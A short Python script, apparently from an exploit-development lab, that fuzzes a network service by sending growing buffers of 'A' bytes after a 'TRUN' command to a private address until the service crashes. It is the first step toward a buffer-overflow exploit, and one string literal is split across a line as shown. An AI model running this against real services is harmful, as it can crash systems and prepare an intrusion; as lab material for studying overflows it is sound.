# Example: Python script for fuzzing
import socket
import sys

buffer = b"A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.100", 9999))
        s.recv(1024)
        s.send(b"TRUN /.:/" + buffer + b"\r
")
        s.recv(1024)
        s.close()
        print(f"Fuzzing with {len(buffer)} bytes")
        buffer += b"A" * 100
    except:
        print("Crash occurred at %s bytes" % len(buffer))
        sys.exit()
